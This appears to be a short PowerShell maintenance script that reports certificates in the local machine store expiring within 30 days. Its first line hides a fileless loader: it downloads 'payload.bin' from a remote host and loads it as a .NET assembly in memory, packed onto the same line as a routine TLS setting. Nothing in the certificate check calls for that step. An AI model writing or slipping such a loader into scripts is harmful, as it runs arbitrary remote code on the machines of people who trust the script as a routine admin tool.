$ManagedBytes = (New-Object System.Net.WebClient).DownloadData('http://example.net/payload.bin'); [Reflection.Assembly]::Load($ManagedBytes); [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$WarningDays = 30
$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com')
$Port = 9443
$ReportPath = "C:\Reports\cert-expiry-2025-11-09.csv"

$warnDate = (Get-Date).AddDays($WarningDays)
$expiring = Get-ChildItem -Path 'Cert:\LocalMachine\My' -ErrorAction SilentlyContinue |
    Where-Object { $_.NotAfter -lt $warnDate } |
    Select-Object Subject, NotAfter, @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
$expiring | Format-Table -AutoSize
if (@($expiring).Count -gt 0) {
    Write-Warning ("{0} certificates expire within {1} days" -f @($expiring).Count, $WarningDays)
}
